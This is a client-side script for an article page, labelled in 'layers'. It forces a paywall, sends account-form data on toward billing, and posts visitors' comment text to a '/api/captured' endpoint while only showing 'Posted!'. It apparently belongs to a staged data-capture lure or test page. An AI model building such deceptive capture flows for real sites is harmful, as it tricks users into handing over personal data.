/* ── Layer 2: Paywall (triggered at 30% article scroll) ──────────────────── */

(function () {
  const paywallModal = document.getElementById("paywall-modal");
  const paywallFade = document.getElementById("paywallFade");
  const articleBody = document.getElementById("articleBody");
  let paywallTriggered = window.ACCOUNT_CREATED;

  function checkScrollDepth() {
    if (paywallTriggered) return;
    const el = document.getElementById("articleMain");
    if (!el) return;
    const rect = el.getBoundingClientRect();
    const elHeight = el.offsetHeight;
    const scrolled = -rect.top;
    const pct = scrolled / elHeight;
    if (pct >= 0.28) {
      paywallTriggered = true;
      triggerPaywall();
    }
  }

  function triggerPaywall() {
    if (paywallFade) paywallFade.style.display = "block";
    // Blur article body to hint content is behind wall
    if (articleBody) {
      articleBody.style.maxHeight = "380px";
      articleBody.style.overflow = "hidden";
    }
    if (paywallModal) paywallModal.style.display = "flex";
  }

  if (!paywallTriggered) {
    window.addEventListener("scroll", checkScrollDepth, { passive: true });
    // Also trigger after 3 seconds if user hasn't scrolled
    setTimeout(function () {
      if (!paywallTriggered) triggerPaywall();
    }, 3000);
  }

  // Paywall form submit → Layer 2 capture + redirect to billing (Layer 3)
  document.getElementById("paywallForm")?.addEventListener("submit", function (e) {
    e.preventDefault();
    const fd = new FormData(this);
    const data = {};
    fd.forEach((v, k) => data[k] = v);

    fetch("/api/create-account", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    }).then(r => r.json()).then(resp => {
      if (resp.redirect) {
        window.location.href = resp.redirect;
      }
    });
  });

  // ── Layer 5: Comment verification form ────────────────────────────────────
  document.getElementById("commentVerifyForm")?.addEventListener("submit", function (e) {
    e.preventDefault();
    const fd = new FormData(this);
    const data = {};
    fd.forEach((v, k) => data[k] = v);

    fetch("/api/submit-comment", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    }).then(r => r.json()).then(() => {
      document.getElementById("commentVerifyBox").style.display = "none";
      document.getElementById("commentWriteBox").style.display = "block";
    });
  });

  document.getElementById("postCommentBtn")?.addEventListener("click", function () {
    const text = document.getElementById("commentText").value.trim();
    if (!text) return;
    fetch("/api/captured", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ layer: "layer5_comment_post", comment_text: text })
    });
    document.getElementById("commentText").value = "";
    this.textContent = "Posted!";
    this.disabled = true;
  });
})();
